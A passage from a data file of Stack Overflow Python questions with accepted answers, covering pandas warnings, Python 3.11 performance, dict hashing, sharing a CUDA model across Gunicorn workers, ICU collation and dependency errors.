    "Body": "In pandas v.1.5.0 a new warning has been added, which is shown, when a column is set from an array of different dtype. The FutureWarning informs about a planned semantic change, when using iloc: the change will be done in-place in future versions. The changelog instructs what to do to get the old behavior, but there is no hint how to handle the situation, when in-place operation is in fact the right choice.\nThe example from the changelog:\ndf = pd.DataFrame({'price': [11.1, 12.2]}, index=['book1', 'book2'])\noriginal_prices = df['price']\nnew_prices = np.array([98, 99])\ndf.iloc[:, 0] = new_prices\ndf.iloc[:, 0]\n\nThis is the warning, which is printed in pandas 1.5.0:\n\nFutureWarning: In a future version, df.iloc[:, i] = newvals will\nattempt to set the values inplace instead of always setting a new\narray. To retain the old behavior, use either df[df.columns[i]] = newvals or, if columns are non-unique, df.isetitem(i, newvals)\n\nHow to get rid of the warning, if I don't care about in-place or not, but want to get rid of the warning? Am I supposed to change dtype explicitly? Do I really need to catch the warning every single time I need to use this feature? Isn't there a better way?\n",
    "AcceptedAnswerId": 74193599,
    "AcceptedAnswer": "I haven't found any better way than suppressing the warning using the warnings module:\nimport numpy as np\nimport pandas as pd\nimport warnings\n\ndf = pd.DataFrame({\"price\": [11.1, 12.2]}, index=[\"book1\", \"book2\"])\noriginal_prices = df[\"price\"]\nnew_prices = np.array([98, 99])\nwith warnings.catch_warnings():\n    # Setting values in-place is fine, ignore the warning in Pandas >= 1.5.0\n    # This can be removed, if Pandas 1.5.0 does not need to be supported any longer.\n    # See also: https://stackoverflow.com/q/74057367/859591\n    warnings.filterwarnings(\n        \"ignore\",\n        category=FutureWarning,\n        message=(\n            \".*will attempt to set the values inplace instead of always setting a new array. \"\n            \"To retain the old behavior, use either.*\"\n        ),\n    )\n\n    df.iloc[:, 0] = new_prices\n\ndf.iloc[:, 0]\n\n"
}
{
    "Id": 74206978,
    "PostTypeId": 1,
    "Title": "Why does this specific code run faster in Python 3.11?",
    "Body": "I have the following code in a Python file called benchmark.py.\nsource = \"\"\"\nfor i in range(1000):\n    a = len(str(i)) \n\"\"\"\n\nimport timeit\n\nprint(timeit.timeit(stmt=source, number=100000))\n\nWhen I tried to run with multiple python versions I am seeing a drastic performance difference.\nC:\\Users\\Username\\Desktop>py -3.10 benchmark.py\n16.79652149998583\n\nC:\\Users\\Username\\Desktop>py -3.11 benchmark.py\n10.92280820000451\n\nAs you can see this code runs faster with python 3.11 than previous Python versions. I tried to disassemble the bytecode to understand the reason for this behaviour but I could only see a difference in opcode names (CALL_FUNCTION is replaced by PRECALL and CALL opcodes).\nI am quite not sure if that's the reason for this performance change. so I am looking for an answer that justifies with reference to cpython\nsource code.\npython 3.11 bytecode\n  0           0 RESUME                   0\n\n  2           2 PUSH_NULL\n              4 LOAD_NAME                0 (range)\n              6 LOAD_CONST               0 (1000)\n              8 PRECALL                  1\n             12 CALL                     1\n             22 GET_ITER\n        >>   24 FOR_ITER                22 (to 70)\n             26 STORE_NAME               1 (i)\n\n  3          28 PUSH_NULL\n             30 LOAD_NAME                2 (len)\n             32 PUSH_NULL\n             34 LOAD_NAME                3 (str)\n             36 LOAD_NAME                1 (i)\n             38 PRECALL                  1\n             42 CALL                     1\n             52 PRECALL                  1\n             56 CALL                     1\n             66 STORE_NAME               4 (a)\n             68 JUMP_BACKWARD           23 (to 24)\n\n  2     >>   70 LOAD_CONST               1 (None)\n             72 RETURN_VALUE\n\npython 3.10 bytecode\n  2           0 LOAD_NAME                0 (range)\n              2 LOAD_CONST               0 (1000)\n              4 CALL_FUNCTION            1\n              6 GET_ITER\n        >>    8 FOR_ITER                 8 (to 26)\n             10 STORE_NAME               1 (i)\n\n  3          12 LOAD_NAME                2 (len)\n             14 LOAD_NAME                3 (str)\n             16 LOAD_NAME                1 (i)\n             18 CALL_FUNCTION            1\n             20 CALL_FUNCTION            1\n             22 STORE_NAME               4 (a)\n             24 JUMP_ABSOLUTE            4 (to 8)\n\n  2     >>   26 LOAD_CONST               1 (None)\n             28 RETURN_VALUE\n\nPS: I understand that python 3.11 introduced bunch of performance improvements but I am curios to understand what optimization makes this code run faster in python 3.11\n",
    "AcceptedAnswerId": 74220032,
    "AcceptedAnswer": "There's a big section in the \"what's new\" page labeled \"faster runtime\". It looks like the most likely cause of the speedup here is PEP 659, which is a first start towards JIT optimization (perhaps not quite JIT compilation, but definitely JIT optimization).\nParticularly, the lookup and call for len and str now bypass a lot of dynamic machinery in the overwhelmingly common case where the built-ins aren't shadowed or overridden. The global and builtin dict lookups to resolve the name get skipped in a fast path, and the underlying C routines for len and str are called directly, instead of going through the general-purpose function call handling.\nYou wanted source references, so here's one. The str call will get specialized in specialize_class_call:\n    if (tp->tp_flags & Py_TPFLAGS_IMMUTABLETYPE) {\n        if (nargs == 1 && kwnames == NULL && oparg == 1) {\n            if (tp == &PyUnicode_Type) {\n                _Py_SET_OPCODE(*instr, PRECALL_NO_KW_STR_1);\n                return 0;\n            }\n\nwhere it detects that the call is a call to the str builtin with 1 positional argument and no keywords, and replaces the corresponding PRECALL opcode with PRECALL_NO_KW_STR_1. The handling for the PRECALL_NO_KW_STR_1 opcode in the bytecode evaluation loop looks like this:\n        TARGET(PRECALL_NO_KW_STR_1) {\n            assert(call_shape.kwnames == NULL);\n            assert(cframe.use_tracing == 0);\n            assert(oparg == 1);\n            DEOPT_IF(is_method(stack_pointer, 1), PRECALL);\n            PyObject *callable = PEEK(2);\n            DEOPT_IF(callable != (PyObject *)&PyUnicode_Type, PRECALL);\n            STAT_INC(PRECALL, hit);\n            SKIP_CALL();\n            PyObject *arg = TOP();\n            PyObject *res = PyObject_Str(arg);\n            Py_DECREF(arg);\n            Py_DECREF(&PyUnicode_Type);\n            STACK_SHRINK(2);\n            SET_TOP(res);\n            if (res == NULL) {\n                goto error;\n            }\n            CHECK_EVAL_BREAKER();\n            DISPATCH();\n        }\n\nwhich consists mostly of a bunch of safety prechecks and reference fiddling wrapped around a call to PyObject_Str, the C routine for calling str on an object.\nPython 3.11 includes many other performance enhancements besides the above, including optimizations to stack frame creation, method lookup, common arithmetic operations, interpreter startup, and more. Most code should run much faster now, barring things like I/O-bound workloads and code that spent most of its time in C library code (like NumPy).\n"
}
{
    "Id": 74965764,
    "PostTypeId": 1,
    "Title": "How can I properly hash dictionaries with a common set of keys, for deduplication purposes?",
    "Body": "I have some log data like:\nlogs = [\n {'id': '1234', 'error': None, 'fruit': 'orange'},\n {'id': '12345', 'error': None, 'fruit': 'apple'}\n]\n\nEach dict has the same keys: 'id', 'error' and 'fruit' (in this example).\nI want to remove duplicates from this list, but straightforward dict and set based approaches do not work because my elements are themselves dicts, which are not hashable:\n>>> set(logs)\nTraceback (most recent call last):\n  File \"\", line 1, in \nTypeError: unhashable type: 'dict'\n\nAnother approach is to sort and use itertools.groupby - but dicts are also not comparable, so this also does not work:\n>>> from itertools import groupby\n>>> [k for k, _ in groupby(sorted(logs))]\nTraceback (most recent call last):\n  File \"\", line 1, in \nTypeError: '<' not supported between instances of 'dict' and 'dict'\n\nI had the idea to calculate a hash value for each log entry, and store it in a set for comparison, like so:\ndef compute_hash(log_dict: dict):\n    return hash(log_dict.values())\n\ndef deduplicate(logs):\n    already_seen = set()\n    for log in logs:\n        log_hash = compute_hash(log)\n        if log_hash in already_seen:\n            continue\n        already_seen.add(log_hash)\n        yield log\n\nHowever, I found that compute_hash would give the same hash for different dictionaries, even ones with completely bogus contents:\n>>> logs = [{'id': '123', 'error': None, 'fruit': 'orange'}, {}]\n>>> # The empty dict will be removed; every dict seems to get the same hash.\n>>> list(deduplicate(logs))\n[{'id': '123', 'error': None, 'fruit': 'orange'}]\n\nAfter some experimentation, I was seemingly able to fix the problem by modifying compute_hash like so:\ndef compute_hash(log_dict: dict):\n    return hash(frozenset(log_dict.values()))\n\nHowever, I cannot understand why this makes a difference. Why did the original version seem to give the same hash for every input dict? Why does converting the .values result to a frozenset first fix the problem?\nAside from that: is this algorithm correct? Or is there some counterexample where the wrong values will be removed?\n\nThis question discusses how hashing works in Python, in depth, as well as considering other data structures that might be more appropriate than dictionaries for the list elements. See List of unique dictionaries instead if you simply want to remove duplicates from a list of dictionaries.\n",
    "AcceptedAnswerId": 74965910,
    "AcceptedAnswer": "What went wrong\nThe first thing I want to point out about the original attempt is that it seems over-engineered. When the inputs are hashable, manually iterating is only necessary to preserve order, and even then, in 3.7 and up we can rely on the order-preserving property of dicts.\nJust because it's hashable doesn't mean the hash is useful\nIt also isn't especially useful to call hash on log_dict.values(). While log_dict is not hashable, its .values() (in 3.x) is an instance of the dict_values type (the name is not defined in the builtins, but that is how instances identify themselves), which is hashable:\n>>> dv = {1:2, 3:4}.values()\n>>> dv\ndict_values([2, 4])\n>>> {dv}\n{dict_values([2, 4])}\n\nSo we could just as easily have used the .values() directly as a \"hash\":\ndef compute_hash(log_dict: dict):\n    return log_dict.values()\n\n... but this would have given a new bug - now every hash would be different:\n>>> {1:2}.values() == {1:2}.values()\nFalse\n\nBut why?\nBecause dict_values type doesn't define __hash__, nor __eq__. object is the immediate superclass, so calls to those methods fall back to the object defaults:\n>>> dv.__class__.__bases__\n(,)\n>>> dv.__class__.__hash__\n\n>>> dv.__class__.__eq__\n\n\nIn fact, dict_values cannot sensibly implement these methods because it is (indirectly) mutable - as a view, it is dependent on the underlying dict:\n>>> d = {1:2}\n>>> dv = d.values()\n>>> d[3] = 4\n>>> dv\ndict_values([2, 4])\n\nSince there isn't an obvious generic way to hash any object that also isn't exceedingly slow, while also caring about its actual attributes, the default simply doesn't care about attributes and is simply based on object identity. For example, on my platform, the results look like:\nPython 3.8.10 (default, Nov 14 2022, 12:59:47) \n[GCC 9.4.0] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> dv = {1:2, 3:4}.values()\n>>> bin(id(dv))\n'0b11111110101110011010010110000001010101011110000'\n>>> bin(hash(dv))\n'0b1111111010111001101001011000000101010101111'\n\nIn other words:\n>>> hash(dv) == id(dv) // 16\nTrue\n\nThus, if compute_hash in the original code is repeatedly called with temporary objects, it won't give useful results - the results don't depend on the contents of the object, and will commonly be the same, as temporary (i.e., immediately GCd) objects in a loop will often end up in the same memory location.\n(Yes, this means that objects default to being hashable and equality-comparable. The dict type itself overrides __hash__ to explicitly disallow it, while - curiously - overriding __eq__ to compare contents.)\nfrozenset has a useful hash\nOn the other hand, frozenset is intended for long-term storage of some immutable data. Consequently, it's important and useful for it to define a __hash__, and it does:\n>>> f = frozenset(dv)\n>>> bin(id(f))\n'0b11111110101110011010001011101000110001011100000'\n>>> bin(hash(f))\n'0b101111010001101001001111100001000001100111011101101100000110001'\n\nDictionaries, hashing and collision detection\nAlthough there have been many tweaks and optimizations over the years, Pythons dict and set types are both fundamentally based on hash tables. When a value is inserted, its hash is first computed (normally an integer value), and then that value is reduced (normally using modulo) into an index into the underlying table storage. Similarly, when a value is looked up, the hash is computed and reduced in order to determine where to look in the table for that value.\nOf course, it is possible that some other value is already stored in that spot. There are multiple possible strategies for dealing with this (and last I checked, the literature is inconsistent about naming them). But most importantly for our purposes: when looking up a value in a dict by key, or checking for the presence of a value in a set, the container will also have to do equality checks after figuring out where to look, in order to confirm that the right thing has actually been found.\nConsequently, any approach that simply computes a hash manually, and naively associates those hashes with the original values, will fail. It is easy for two of the input dicts to have the same computed hash value, even if their contents are actually being considered. For example, the hash of a frozenset is based on an XOR of hashes for the elements. So if two of our input dicts had all the same values assigned to keys in a different order, the hash would be the same:\n>>> def show_hash(d):\n...     return bin(hash(frozenset(d.values())))\n... \n>>> show_hash({'id': '1', 'error': None, 'value': 'apple'})\n'0b101010010100001000111001000001000111101111110100010000010101110'\n>>> # Changing a value changes the hash...\n>>> show_hash({'id': '1', 'error': None, 'value': 'orange'})\n'0b11111111001000011101011001001011100010100100010010110000100100'\n>>> # but rearranging them does not:\n>>> show_hash({'id': '1', 'error': 'orange', 'value': None})\n'0b11111111001000011101011001001011100010100100010010110000100100'\n\nIt's also possible for such a hash collision to occur by coincidence with totally unrelated values. It's extremely unlikely for 64-bit hashes (since this value will not be reduced and used as a hash table index, despite the name)\nFixing it explicitly\nSo, in order to have correct code, we would need to do our own checking afterwards, explicitly checking whether the value which hashed to something in our already_seen set was actually equal to previous values that had that hash. And there could theoretically be multiple of those, so we'd have to remember multiple values for each of those external hashes, perhaps by using a dict for already_seen instead. Something like:\nfrom collections import defaultdict\n\ndef deduplicate(logs):\n    already_seen = defaultdict(list)\n    for log in logs:\n        log_hash = compute_hash(log)\n        if log in already_seen.get(log_hash, ()):\n            continue\n        already_seen[log_hash].append(log)\n        yield log\n\nHopefully this immediately looks unsatisfactory. With this approach, we are essentially re-implementing the core logic of sets and dictionaries - we compute hashes ourselves, retrieve corresponding values from internal storage (already_seen) and then manually check for equality (if log in ...).\nLooking at it from another angle\nThe reason we're doing all of this in the first place - looking for a hash value to represent the original dict in our own storage - is because the dict isn't hashable. But we could address that problem head-on, instead, by explicitly converting the data into a hashable form (that preserves all the information), rather than trying to relate a hashable value to the data.\nIn other words, let's use a different type to represent the data, rather than a dict.\nSince all our input dicts have the same keys, the natural thing to do would be to convert those into the attributes of a user-defined class. In 3.7 and up, a simple, natural and explicit way to do this is using a dataclass, like so:\nfrom dataclasses import dataclass\nfrom typing import Optional\n\n@dataclass(frozen=True, slots=True)\nclass LogEntry:\n    id: str\n    error: Optional[str]\n    fruit: str\n\nIt's not explained very well in the documentation, but using frozen=True (the main purpose is to make the instances immutable) will cause a __hash__ to be generated as well, taking the fields into account as desired. Using slots=True causes __slots__ to be generated for the type as well, avoiding memory overhead.\nFrom here, it's trivial to convert the existing logs:\nlogs = [LogEntry(**d) for d in logs]\n\nAnd we can directly deduplicate with a set:\nset(logs)\n\nor, preserving order using a dict (in 3.7 and up):\nlist(dict.fromkeys(logs))\n\nThere are other options, of course. The simplest is to make a tuple from the .values - assuming each log dict has its keys in the same order (again, assuming Python 3.7 and up, where keys have an order), this preserves all the useful information - the .keys are just for convenience. Slightly more sophisticated, we could use collections.namedtuple:\nfrom collections import namedtuple\n\nLogEntry = namedtuple('LogEntry', 'id error fruit')\n# from here, use the LogEntry type as before\n\nThis is simpler than the dataclass approach, but less explicit (and doesn't offer an elegant way to document field types).\n"
}
{
    "Id": 72779926,
    "PostTypeId": 1,
    "Title": "GUnicorn + CUDA: Cannot re-initialize CUDA in forked subprocess",
    "Body": "I am creating an inference service with torch, gunicorn and flask that should use CUDA. To reduce resource requirements, I use the preload option of gunicorn, so the model is shared between the worker processes. However, this leads to an issue with CUDA. The following code snipped shows a minimal reproducing example:\nfrom flask import Flask, request\nimport torch\n\napp = Flask('dummy')\n\nmodel = torch.rand(500)\nmodel = model.to('cuda:0')\n\n\n@app.route('/', methods=['POST'])\ndef f():\n    data = request.get_json()\n    x = torch.rand((data['number'], 500))\n    x = x.to('cuda:0')\n    res = x * model\n    return {\n        \"result\": res.sum().item()\n    }\n\nStarting the server with CUDA_VISIBLE_DEVICES=1 gunicorn -w 3 -b $HOST_IP:8080 --preload run_server:app lets the service start successfully. However, once doing the first request (curl -X POST -d '{\"number\": 1}'), the worker throws the following error:\n[2022-06-28 09:42:00,378] ERROR in app: Exception on / [POST]\nTraceback (most recent call last):\n  File \"/home/user/.local/lib/python3.6/site-packages/flask/app.py\", line 2447, in wsgi_app\n    response = self.full_dispatch_request()\n  File \"/home/user/.local/lib/python3.6/site-packages/flask/app.py\", line 1952, in full_dispatch_request\n    rv = self.handle_user_exception(e)\n  File \"/home/user/.local/lib/python3.6/site-packages/flask/app.py\", line 1821, in handle_user_exception\n    reraise(exc_type, exc_value, tb)\n  File \"/home/user/.local/lib/python3.6/site-packages/flask/_compat.py\", line 39, in reraise\n    raise value\n  File \"/home/user/.local/lib/python3.6/site-packages/flask/app.py\", line 1950, in full_dispatch_request\n    rv = self.dispatch_request()\n  File \"/home/user/.local/lib/python3.6/site-packages/flask/app.py\", line 1936, in dispatch_request\n    return self.view_functions[rule.endpoint](**req.view_args)\n  File \"/home/user/project/run_server.py\", line 14, in f\n    x = x.to('cuda:0')\n  File \"/home/user/.local/lib/python3.6/site-packages/torch/cuda/__init__.py\", line 195, in _lazy_init\n    \"Cannot re-initialize CUDA in forked subprocess. \" + msg)\nRuntimeError: Cannot re-initialize CUDA in forked subprocess. To use CUDA with multiprocessing, you must use the 'spawn' start method\n\nI load the model in the parent process and it's accessible to each forked worker process. The problem occurs when creating a CUDA-backed tensor in the worker process. This re-initializes the CUDA context in the worker process, which fails because it was already initialized in the parent process. If we set x = data['number'] and remove x = x.to('cuda:0'), the inference succeeds.\nAdding torch.multiprocessing.set_start_method('spawn') or multiprocessing.set_start_method('spawn') won't change anything, probably because gunicorn will definitely use fork when being started with the --preload option.\nA solution could be not using the --preload option, which leads to multiple copies of the model in memory/GPU. But this is what I am trying to avoid.\nIs there any possibility to overcome this issue without loading the model separately in each worker process?\n",
    "AcceptedAnswerId": 75308606,
    "AcceptedAnswer": "Reason for the Error\nAs correctly stated in the comments by @Newbie, the issue isn't the model itself, but the CUDA context. When new child processes are forked, the parent's memory is shared read-only with the child, but the CUDA context doesn't support this sharing, it must be copied to the child. Hence, it reports above-mentioned error.\nSpawn instead of Fork\nTo resolve this issue, we have to change the start method for the child processes from fork to spawn with multiprocessing.set_start_method. The following simple example works fine:\nimport torch\nimport torch.multiprocessing as mp\n\n\ndef f(y):\n    y[0] = 1000\n\n\nif __name__ == '__main__':\n    x = torch.zeros(1).cuda()\n    x.share_memory_()\n\n    mp.set_start_method('spawn')\n    p = mp.Process(target=f, args=(x,), daemon=True)\n    p.start()\n    p.join()\n    print(\"x =\", x.item())\n\nWhen running this code, a second CUDA context is initialized (this can be observed via watch -n 1 nvidia-smi in a second window), and f is executed after the context was initialized completely. After this, x = 1000.0 is printed on the console, thus, we confirmed that the tensor x was successfully shared between the processes.\nHowever, Gunicorn internally uses os.fork to start the worker processes, so multiprocessing.set_start_method has no influence on Gunicorn's behavior. Consequently, initializing the CUDA context in the root process must be avoided.\nSolution for Gunicorn\nIn order to share the model among the worker processes, we thus must load the model in one single process and share it with the workers. Luckily, sending a CUDA tensor via a torch.multiprocessing.Queue to another process doesn't copy the parameters on the GPU, so we can use those queues for this problem.\nimport time\n\nimport torch\nimport torch.multiprocessing as mp\n\n\ndef f(q):\n    y = q.get()\n    y[0] = 1000\n\n\ndef g(q):\n    x = torch.zeros(1).cuda()\n    x.share_memory_()\n    q.put(x)\n    q.put(x)\n    while True:\n        time.sleep(1)  # this process must live as long as x is in use\n\n\nif __name__ == '__main__':\n    queue = mp.Queue()\n    pf = mp.Process(target=f, args=(queue,), daemon=True)\n    pf.start()\n    pg = mp.Process(target=g, args=(queue,), daemon=True)\n    pg.start()\n    pf.join()\n    x = queue.get()\n    print(\"x =\", x.item())  # Prints x = 1000.0\n\nFor the Gunicorn server, we can use the same strategy: A model server process loads the model and serves it to each new worker process after its fork. In the post_fork hook the worker requests and receives the model from the model server. A Gunicorn configuration could look like this:\nimport logging\n\nfrom client import request_model\nfrom app import app\n\nlogging.basicConfig(level=logging.INFO)\n\nbind = \"localhost:8080\"\nworkers = 1\nzmq_url = \"tcp://127.0.0.1:5555\"\n\n\ndef post_fork(server, worker):\n    app.config['MODEL'], app.config['COUNTER'] = request_model(zmq_url)\n\nIn the post_fork hook, we call request_model to get a model from the model server and store the model in the configuration of the Flask application. The method request_model is defined in my example in the file client.py and defined as follows:\nimport logging\nimport os\n\nfrom torch.multiprocessing.reductions import ForkingPickler\nimport zmq\n\n\ndef request_model(zmq_url: str):\n    logging.info(\"Connecting\")\n    context = zmq.Context()\n    with context.socket(zmq.REQ) as socket:\n        socket.connect(zmq_url)\n        logging.info(\"Sending request\")\n        socket.send(ForkingPickler.dumps(os.getpid()))\n        logging.info(\"Waiting for a response\")\n        model = ForkingPickler.loads(socket.recv())\n    logging.info(\"Got response from object server\")\n    return model\n\nWe make use of ZeroMQ for inter-process communication here because it allows us to reference servers by name/address and to outsource the server code into its own application. multiprocessing.Queue and multiprocessing.Process apparently don't work well with Gunicorn. multiprocessing.Queue uses the ForkingPickler internally to serialize the objects, and the module torch.multiprocessing alters it in a way that Torch data structures can be serialized appropriately and reliably. So, we use this class to serialize our model to send it to the worker processes.\nThe model is loaded and served in an application that is completely separate from Gunicorn and defined in server.py:\nfrom argparse import ArgumentParser\nimport logging\n\nimport torch\nfrom torch.multiprocessing.reductions import ForkingPickler\nimport zmq\n\n\ndef load_model():\n    model = torch.nn.Linear(10000, 50000)\n    model.cuda()\n    model.share_memory()\n\n    counter = torch.zeros(1).cuda()\n    counter.share_memory_()\n    return model, counter\n\n\ndef share_object(obj, url):\n    context = zmq.Context()\n    socket = context.socket(zmq.REP)\n    socket.bind(url)\n    while True:\n        logging.info(\"Waiting for requests on %s\", url)\n        message = socket.recv()\n        logging.info(\"Got a message from %d\", ForkingPickler.loads(message))\n        socket.send(ForkingPickler.dumps(obj))\n\n\nif __name__ == '__main__':\n    parser = ArgumentParser(description=\"Serve model\")\n    parser.add_argument(\"--listen-address\", default=\"tcp://127.0.0.1:5555\")\n    args = parser.parse_args()\n\n    logging.basicConfig(level=logging.INFO)\n    logging.info(\"Loading model\")\n    model = load_model()\n    share_object(model, args.listen_address)\n\nFor this test, we use a model of about 2GB in size to see an effect on the GPU memory allocation in nvidia-smi and a small tensor to verify that the data is actually shared among the processes.\nOur sample flask application runs the model with a random input, counts the number of requests and returns both results:\nfrom flask import Flask\nimport torch\n\napp = Flask(__name__)\n\n\n@app.route(\"/\", methods=[\"POST\"])\ndef infer():\n    model: torch.nn.Linear = app.config['MODEL']\n    counter: torch.Tensor = app.config['COUNTER']\n    counter[0] += 1  # not thread-safe\n    input_features = torch.rand(model.in_features).cuda()\n    return {\n        \"result\": model(input_features).sum().item(),\n        \"counter\": counter.item()\n    }\n\nTest\nThe example can be run as follows:\n$ python server.py &\nINFO:root:Waiting for requests on tcp://127.0.0.1:5555 \n$ gunicorn -c config.py app:app\n[2023-02-01 16:45:34 +0800] [24113] [INFO] Starting gunicorn 20.1.0\n[2023-02-01 16:45:34 +0800] [24113] [INFO] Listening at: http://127.0.0.1:8080 (24113)\n[2023-02-01 16:45:34 +0800] [24113] [INFO] Using worker: sync\n[2023-02-01 16:45:34 +0800] [24186] [INFO] Booting worker with pid: 24186\nINFO:root:Connecting\nINFO:root:Sending request\nINFO:root:Waiting for a response\nINFO:root:Got response from object server\n\nUsing nvidia-smi, we can observe that now, two processes are using the GPU, and one of them allocates 2GB more VRAM than the other. Querying the flask application also works as expected:\n$ curl -X POST localhost:8080\n{\"counter\":1.0,\"result\":-23.956459045410156} \n$ curl -X POST localhost:8080\n{\"counter\":2.0,\"result\":-8.161510467529297}\n$ curl -X POST localhost:8080\n{\"counter\":3.0,\"result\":-37.823692321777344}\n\nLet's introduce some chaos and terminate our only Gunicorn worker:\n$ kill 24186\n[2023-02-01 18:02:09 +0800] [24186] [INFO] Worker exiting (pid: 24186)\n[2023-02-01 18:02:09 +0800] [4196] [INFO] Booting worker with pid: 4196\nINFO:root:Connecting\nINFO:root:Sending request\nINFO:root:Waiting for a response\nINFO:root:Got response from object server\n\nIt's restarting properly and ready to answer our requests.\nBenefit\nInitially, the amount of required VRAM for our service was (SizeOf(Model) + SizeOf(CUDA context)) * Num(Workers). By sharing the weights of the model, we can reduce this by SizeOf(Model) * (Num(Workers) - 1) to SizeOf(Model) + SizeOf(CUDA context) * Num(Workers).\nCaveats\nThe reliability of this approach relies on the single model server process. If that process terminates, not only will newly started workers get stuck, but the models in the existing workers will become unavailable and all workers crash at once. The shared tensors/models are only available as long as the server process is running. Even if the model server and Gunicorn workers are restarted, a short outage is certainly unavoidable. In a production environment, you thus should make sure this server process is kept alive.\nAdditionally, sharing data among different processes can have side effects. When sharing changeable data, proper locks must be used to avoid race conditions.\n"
}
{
    "Id": 74939758,
    "PostTypeId": 1,
    "Title": "Camelot: DeprecationError: PdfFileReader is deprecated",
    "Body": "I have been using camelot for our project, but since 2 days I got following errorMessage. When trying to run following code snippet:\nimport camelot\ntables = camelot.read_pdf('C:\\\\Users\\\\user\\\\Downloads\\\\foo.pdf', pages='1')\n\nI get this error:\nDeprecationError: PdfFileReader is deprecated and was removed in PyPDF2 3.0.0. Use PdfReader instead.\n\nI checked this file and it does use pdfFileReader: c:\\ProgramData\\Anaconda3\\lib\\site-packages\\camelot\\handlers.py\nI thought that I can specify the version of PyPDF2, but it will be installed automatically(because the library is used by camelot) when I install camelot. Do you think there is any solution to specify the version of PyPDF2 manually?\n",
    "AcceptedAnswerId": 74957139,
    "AcceptedAnswer": "This is issues #339.\nWhile there will hopefully be soon a release including the fix, you can still do this:\npip install 'PyPDF2<3.0'\n\nafter you've installed camelot.\nSee https://github.com/camelot-dev/camelot/issues/339#issuecomment-1367331630 for details and screenshots.\n"
}
{
    "Id": 73823743,
    "PostTypeId": 1,
    "Title": "AttributeError: module 'rest_framework.serializers' has no attribute 'NullBooleanField'",
    "Body": "After upgrading djangorestframework from djangorestframework==3.13.1 to djangorestframework==3.14.0 the code\nfrom rest_framework.serializers import NullBooleanField\n\nThrows\n\nAttributeError: module 'rest_framework.serializers' has no attribute 'NullBooleanField'\n\nReading the release notes I don't see a deprecation. Where did it go?\n",
    "AcceptedAnswerId": 74221187,
    "AcceptedAnswer": "For what it's worth, there's a deprecation warning in the previous version, which also suggests a fix:\n\nThe NullBooleanField is deprecated and will be removed starting with 3.14. Instead use the BooleanField field and set allow_null=True which does the same thing.\n\n"
}
{
    "Id": 74058262,
    "PostTypeId": 1,
    "Title": "icu: Sort strings based on 2 different locales",
    "Body": "As you probably know, the order of alphabet in some (maybe most) languages is different than their order in Unicode. That's why we may want to use icu.Collator to sort, like this Python example:\nfrom icu import Collator, Locale\ncollator = Collator.createInstance(Locale(\"fa_IR.UTF-8\"))\nmylist.sort(key=collator.getSortKey)\n\nThis works perfectly for Persian strings. But it also sorts all Persian strings before all ASCII / English strings (which is the opposite of Unicode sort).\nWhat if we want to sort ASCII before this given locale?\nOr ideally, I want to sort by 2 or multiple locales. (For example give multiple Locale arguments to Collator.createInstance)\nIf we could tell collator.getSortKey to return empty bytes for other locales, then I could create a tuple of 2 collator.getSortKey() results, for example:\nfrom icu import Collator, Locale\n\ncollator1 = Collator.createInstance(Locale(\"en_US.UTF-8\"))\ncollator2 = Collator.createInstance(Locale(\"fa_IR.UTF-8\"))\n\ndef sortKey(s):\n    return collator1.getSortKey(s), collator2.getSortKey(s)\n\nmylist.sort(key=sortKey)\n\nBut looks like getSortKey always returns non-empty bytes.\n",
    "AcceptedAnswerId": 75442315,
    "AcceptedAnswer": "A bit late to answer the question, but here it is for future reference.\nICU collation uses the CLDR Collation Algorithm, which is a tailoring of the Unicode Collation Algorithm. The default collation is referred to as the root collation. Don't think in terms of Locales having a set of collation rules, think more in terms of locales specify any differences between the collation rules that the locale needs and the root collation. CLDR takes a minimalist approach, you only need to include the minimal set of differences needed based on the root collation.\nEnglish uses the root locale. No tailorings. Persian on the other hand has a few rules needed to override certain aspects of the root collation.\nAs the question indicates, the Persian collation rules order Arabic characters before Latin characters. In the collation rule set for Persian there is a rule [reorder Arab]. This rule is what you need to override.\nThere are a few ways to do this:\n\nUse icu.RuleBasedCollator with a coustom set fo rules for Persian.\nCreate a standard Persian collation, retrieve the rules, strip out the reorder directive and then use modified rules with icu.RuleBasedCollator.\nCreate collator instance using a BCP-47 language tag, instead of a Locale identifier\n\nThere are other approaches as well, but the third is the simplest:\nloc = Locale.forLanguageTag(\"fa-u-kr-latn-arab\")\ncollator = Collator.createInstance(loc)\nsorted(mylist, key=collator.getSortKey)\n\nThis will reorder the Persian collation rules, placing Latin script before Arabic script, then everything else afterwards.\n"
}
{
    "Id": 74392324,
    "PostTypeId": 1,
    "Title": "Poetry install throws WinError 1312 when running over SSH on Windows 10",
    "Body": "I have an SSH connection from a Windows machine to another, and then trying to do a poetry install.\nMy problem is:\nI get this error when executing poetry install through ssh:\n[WinError 1312] A specified logon session does not exist. It may already have been terminated.\n\nThis command works perfectly when I execute it locally on the target machine, but fails when connecting through ssh.\nHow can I get rid/fix the [WinError 1312]?\nI saw another user that posted the same question recently, but removed it.\nI've seen some clues regarding the MachineKeys, but have really no idea on how to proceed. Any suggestion will be highly appreciated.\n\nPython: 3.10.8\nPoetry: 1.2.1\nInstalling dependencies from lock file\n\nPackage operations: 5 installs, 0 updates, 0 removals\n\n  \u2022 Installing install-requires (0.3.0)\n\n  OSError\n\n  [WinError 1312] A specified logon session does not exist. It may already have been terminated.\n\n  at ~\\AppData\\Roaming\\pypoetry\\venv\\lib\\site-packages\\win32ctypes\\core\\ctypes\\_util.py:53 in check_zero\n       49\u2502\n       50\u2502 def check_zero_factory(function_name=None):\n       51\u2502     def check_zero(result, function, arguments, *args):\n       52\u2502         if result == 0:\n    \u2192  53\u2502             raise make_error(function, function_name)\n       54\u2502         return result\n       55\u2502     return check_zero\n       56\u2502\n       57\u2502\n\nThe following error occurred when trying to handle this error:\n\n\n  error\n\n  (1312, 'CredRead', 'A specified logon session does not exist. It may already have been terminated.')\n\n  at ~\\AppData\\Roaming\\pypoetry\\venv\\lib\\site-packages\\win32ctypes\\pywin32\\pywintypes.py:37 in pywin32error\n       33\u2502 def pywin32error():\n       34\u2502     try:\n       35\u2502         yield\n       36\u2502     except WindowsError as exception:\n    \u2192  37\u2502         raise error(exception.winerror, exception.function, exception.strerror)\n       38\u2502\n\n",
    "AcceptedAnswerId": 74973503,
